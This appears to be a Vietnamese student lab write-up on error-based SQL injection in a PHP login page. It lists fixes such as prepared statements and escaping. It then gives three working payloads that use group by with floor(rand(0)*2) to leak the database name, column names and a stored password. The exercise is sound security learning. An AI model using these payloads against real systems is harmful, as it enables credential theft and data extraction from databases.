# Link demo : 
# Cách khắc phục :
Có thể khắc phục bằng cách tham số hóa đầu vào của thâm số người dùng truyền vào bằng một số cách như là:
-  $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
  $stmt->bind_param("ss", $username, $password);
  $stmt->execute();
- Hoặc làm sạch đầu vào   $cleaned_username = mysqli_real_escape_string($conn, $username);
$cleaned_password = mysqli_real_escape_string($conn, $password);
- Và tìm hiểu các CVE của các phiên bản để tránh được lỗi này có thể xảy ra.

Khi em vào giao diện sẽ như thế này


![Alt text](image-1.png)

- Đây là đoạn code dính lỗi sqli:

![Alt text](image-2.png)

- Em thử dùng lỗi error base để kiểm tra: em sử dụng payload :"' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- -" trong cheat seet sqli

- or 1=1: Điều kiện luôn đúng, mục đích là để thêm điều kiện vào câu truy vấn.
- group by concat(database(),'-', floor(rand(0)*2)): Group các kết quả theo giá trị của chuỗi được tạo ra bằng cách ghép nối tên cơ sở dữ liệu, dấu "-", và một giá trị ngẫu nhiên (0 hoặc 1).
- having min(0): Điều kiện HAVING luôn đúng, vì giá trị nhỏ nhất trong trường min(0) là 0.

+ Em nhận được kết quả
![Alt text](image-3.png)

- Em có thể thấy được là kết quả trả ra lỗi của database task2_kcsc bảng users và có 1 cột là id
- Em tiếp tục tìm các cột khác trong bảng users
Payload : ' or 1=1 group by concat((select column_name from information_schema.columns where table_name='users' limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
![Alt text](image-4.png)
- sau đó em dùng : ' or 1=1 group by concat((select password from users limit 2,1),'-',floor(rand(0)*2)) having min(0)-- -
-> Em nhận được mật khẩu là hihi123


